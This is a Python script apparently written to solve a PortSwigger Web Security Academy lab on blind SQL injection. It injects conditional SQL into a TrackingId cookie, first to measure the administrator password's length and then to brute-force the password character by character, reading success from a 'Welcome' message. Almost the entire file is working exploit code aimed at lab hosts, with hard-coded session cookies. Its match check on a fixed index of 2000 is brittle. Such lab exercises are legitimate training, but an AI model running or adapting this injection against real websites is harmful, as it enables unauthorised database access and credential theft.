# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Be sure to replace the URL, the Session Cookie and the Tracking ID cookie with your own.
# Huge help from Neisan and Haxguy. Couldn't have do it with out you.



import requests
import string
#Mquery = """' AND (SELECT 'PPPP' FROM users WHERE username='administrator' and Length(password)>1 )='PPPP"""
Cquery = "CDYqbMCzSsI74o8w"

def basic_q(q):
	
	Mquery = q
	cookiesStuff = {'TrackingId':Cquery+Mquery,'session':'YVWLiuB4RkbPjS0hMX7JPK8EgjedhUKy'}
	r = requests.get('https://acf81f571fa6e54780429fc900150065.web-security-academy.net/',cookies=cookiesStuff)
	print(Cquery+Mquery)
	print(r.text.find('Welcome'))

#Passed = r.text.find('Welcome')




#print(Nquery)

def passwordLength():
	for x in range (0,40):
		
		Mquery = f"""' AND (SELECT 'a' FROM users WHERE username='administrator' and Length(password)={x} )='a"""
		cookiesStuff = {'TrackingId':Cquery+Mquery,'session':'sPU8wPuBIAAI87M8C0UlqtZ6xhADy7up'}
		r = requests.get('https://acf81f571fa6e54780429fc900150065.web-security-academy.net/',cookies=cookiesStuff)
		print(r.text.find('Welcome'), "Testing " , x)
		print(r.status_code)
		
		
def split(word): 
    return [char for char in word]  		

def passwordbrute(pass_len):
	passleng = pass_len
	char = split(string.printable)
	
	Found_password = ""
	
	for x in range(1,21):
		for y in char:
			Mquery = f"""' AND (SELECT SUBSTRING(password,1,{x}) from users WHERE username='administrator')='{Found_password}{y}' --"""
			cookiesStuff = 		{'TrackingId':Cquery+Mquery,'session':'sPU8wPuBIAAI87M8C0UlqtZ6xhADy7up'}
			r = requests.get('https://ac981f3c1e6a247780a93c0800b700f1.web-security-academy.net/',cookies=cookiesStuff)
			print(str(r.text.find('Welcome')) + " --- " + str(r.status_code))
			print(Mquery)
			
			if (r.text.find('Welcome') == 2000):
				Found_password = Found_password + y
				break
		
		
passwordbrute(2)

